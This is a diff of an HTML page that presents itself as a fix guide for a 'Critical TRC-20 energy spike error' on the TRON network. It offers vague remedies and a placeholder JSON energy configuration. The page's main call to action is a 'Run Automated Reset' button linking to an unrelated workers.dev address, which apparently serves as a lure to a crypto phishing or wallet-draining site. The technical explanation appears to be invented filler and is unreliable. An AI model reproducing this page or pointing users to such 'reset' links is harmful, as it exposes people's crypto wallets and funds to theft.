@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: sans-serif;
-        background: #1a1a24;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #00adb5; }
     .btn {
-        background: #00adb5;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,46 +41,31 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "Critical TRC-20 energy spike error" message, indicating an abnormal increase in energy consumption by a TRC-20 smart contract on the TRON network.</li>
+<li>The user encounters a "Critical TRC-20 energy spike error" message, indicating an abnormal increase in energy consumption by a TRC-20 smart contract on the TRON network, leading to failed transactions or contract executions.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs when a TRC-20 smart contract exceeds the maximum allowed energy limit, causing the contract execution to fail and resulting in the error message.</li>
+<li>This error occurs when a smart contract's energy consumption exceeds the allowed limit, often due to inefficient coding, excessive computational requirements, or unexpected usage patterns, causing the contract to fail and resulting in this critical error.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Adjust the contract's energy limits by modifying the <code>energyLimit</code> parameter in the contract's configuration.</li>
-<li>Optimize the contract's code to reduce energy consumption by minimizing computational complexity.</li>
-<li>Update the contract's ABI to reflect changes in the contract's functionality and energy requirements, as shown in the following example:</li>
+<li>Adjust the contract's energy settings to prioritize efficiency and reduce consumption.</li>
+<li>Implement optimization techniques in the contract's code to minimize computational overhead.</li>
+<li>Use the following JSON configuration to update the contract's energy parameters:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;contractName&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TRC20Token&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;contractAddress&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TLxxxx&quot;</span><span class="p">,</span>
 <span class="w">  </span><span class="nt">&quot;energyLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10000</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;abi&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<span class="w">    </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;constant&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;inputs&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
-<span class="w">      </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;name&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;outputs&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<span class="w">        </span><span class="p">{</span>
-<span class="w">          </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span>
-<span class="w">          </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;string&quot;</span>
-<span class="w">        </span><span class="p">}</span>
-<span class="w">      </span><span class="p">],</span>
-<span class="w">      </span><span class="nt">&quot;payable&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;stateMutability&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;view&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;function&quot;</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="w">  </span><span class="p">]</span>
+<span class="w">  </span><span class="nt">&quot;energyFee&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for further debugging and testing. </p>
+<p>Consider accessing the contract through a dedicated console for more precise control. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Familiarity with TRON's smart contract development environment</li>
-<li>Understanding of TRC-20 token standards and energy consumption mechanisms</li>
-<li>Access to the contract's source code and configuration files</li>
+<li>A basic understanding of TRON's smart contract architecture</li>
+<li>Familiarity with TRC-20 token standards and energy mechanics</li>
+<li>Access to the TRON Web3 console or a compatible interface</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
